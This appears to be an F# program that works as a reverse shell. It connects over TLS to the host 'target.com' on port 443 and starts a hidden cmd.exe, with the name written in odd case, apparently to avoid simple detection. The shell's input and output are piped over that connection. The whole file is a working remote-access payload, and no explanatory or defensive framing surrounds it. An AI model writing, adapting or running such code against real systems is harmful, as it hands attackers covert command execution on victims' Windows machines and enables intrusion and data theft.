open System
open System.Net
open System.Net.Security
open System.Diagnostics

let rec asyncStdin (stream: System.Net.Security.SslStream, cmd: Process) =
    async {
        let input = stream.ReadByte() |> Char.ConvertFromUtf32
        cmd.StandardInput.Write(input)

        return! asyncStdin (stream, cmd)
    }

let rec asyncStdout (stream: System.Net.Security.SslStream, cmd: Process) =
    async {
        let output = cmd.StandardOutput.Read() |> Char.ConvertFromUtf32
        let outbyte = System.Text.Encoding.UTF32.GetBytes(output)
        stream.Write(outbyte, 0, outbyte.Length)

        return! asyncStdout (stream, cmd)
    }

let main =
    let client = new System.Net.Sockets.TcpClient()
    
    client.Connect("target.com", 443)

    let stream = new SslStream(client.GetStream())

    stream.AuthenticateAsClient("target.com");

    let procStartInfo = ProcessStartInfo (
                         FileName = "cMd.exe",
                         RedirectStandardInput = true,
                         RedirectStandardOutput = true,
                         RedirectStandardError = true,
                         UseShellExecute = false,
                         CreateNoWindow = true
    )

    let cmd = new Process(StartInfo = procStartInfo)
    let err = cmd.Start()

    asyncStdin (stream, cmd) |> Async.Start
    asyncStdout (stream, cmd) |> Async.RunSynchronously

    stream.Flush()
    
    System.Threading.Thread.Sleep(TimeSpan.FromSeconds(30.0))
    
main
